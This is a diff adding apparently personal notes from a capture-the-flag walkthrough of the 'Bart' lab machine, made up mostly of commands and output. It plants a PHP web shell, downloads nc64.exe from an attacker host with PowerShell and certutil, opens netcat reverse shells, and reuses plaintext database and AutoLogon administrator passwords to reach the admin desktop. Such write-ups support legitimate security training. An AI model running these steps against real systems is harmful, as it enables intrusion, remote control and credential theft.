@@ -1,0 +1,123 @@
+┌──(ed㉿kali)-[~]
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.10.81/FUZZ' -fs 158607 -t 110
+# on at least 2 different hosts [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 235ms]
+#                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 256ms]
+forum                   [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 5322ms]
+monitor                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 7916ms]
+
+//forum is the main page, monitor is a login page.
+//collect user name from source code of main page, and use forget passwd to check only danial and harvey is vadid.
+//
+
+└─$ cewl -d 2 -w w.txt http://forum.bart.htb       
+CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+//collect passwd candidates from main page.
+
+
+─$ curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=abc&passwd=abcabc123"
+
+<?php system($_GET['cmd']); ?>
+
+http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&cmd=whoami
+
+
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/nc64.exe','C:\Windows\Temp\nc64.exe')
+
+certutil -urlcache -f http://10.10.16.8/nc64.exe C:\inetpub\wwwroot\internal-01\log\nc64.exe
+
+nc64.exe -e cmd.exe 10.10.16.8 8821
+//use url ncode the command
+http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&cmd=nc64.exe%20-e%20cmd.exe%2010.10.16.8%208821
+
+└─$ nc -nvlp 8821                             
+listening on [any] 8821 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.10.81] 52023
+Microsoft Windows [Version 10.0.15063]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\internal-01\log>whoami
+whoami
+nt authority\iusr
+
+C:\inetpub\wwwroot\internal-01\simple_chat\includes>type dbconnect.php
+type dbconnect.php
+<?php
+/**********************************************\
+* Copyright (c) 2013 Manolis Agkopian          *
+* See the file LICENCE for copying permission. *
+\**********************************************/
+
+if (!defined('INCLUDED')){
+	define('INCLUDED',true);
+	require 'markup_func.php';
+	header('HTTP/1.1 403 Forbidden');
+	do_html_403();
+	die();
+}
+
+function db_connect() {
+	$con = @mysqli_connect('localhost', 'harvey', '!IC4nB3Th3B3st?', 'internal_chat');
+	if ($con === false) {
+		return false;
+	}
+	
+	mysqli_set_charset ($con , 'UTF-8');
+	return $con;
+}
+?>
+
+
+//from winpeas
+����������͹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  DESKTOP-7I3S68E
+    DefaultUserName               :  Administrator
+    DefaultPassword               :  3130438f31186fbaf962f407711faddb
+
+
+$passwd = ConvertTo-SecureString "3130438f31186fbaf962f407711faddb" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("BART\Administrator", $passwd)
+Start-Process nc64.exe -e cmd.exe 10.10.16.8 8822 -Credential $cred
+
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "BART\Administrator",$passwd 
+
+Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+
+C:\inetpub\wwwroot\internal-01\log>powershell
+powershell
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\inetpub\wwwroot\internal-01\log> $passwd = ConvertTo-SecureString "3130438f31186fbaf962f407711faddb" -AsPlainText -Force
+$passwd = ConvertTo-SecureString "3130438f31186fbaf962f407711faddb" -AsPlainText -Force
+PS C:\inetpub\wwwroot\internal-01\log> $cred = New-Object System.Management.Automation.PSCredential ("BART\Administrator", $passwd)
+$cred = New-Object System.Management.Automation.PSCredential ("BART\Administrator", $passwd)
+PS C:\inetpub\wwwroot\internal-01\log> 
+
+PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+bart\administrator
+
+\\runas and this way not works for cmd or powershell
+\\net use
+
+net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
+PS C:\Users\Administrator> x:
+x:
+PS X:\> cd users\administrator\desktop
+cd users\administrator\desktop
+PS X:\users\administrator\desktop> dir
+dir
+
+
+    Directory: X:\users\administrator\desktop
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-ar---       30/10/2025     01:41             34 root.txt                      
+
+net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
+net use y: \\localhost\c$ /user:h.harvey !IC4nB3Th3B3st?
+PS X:\users\administrator\desktop> type root.txt
+type root.txt
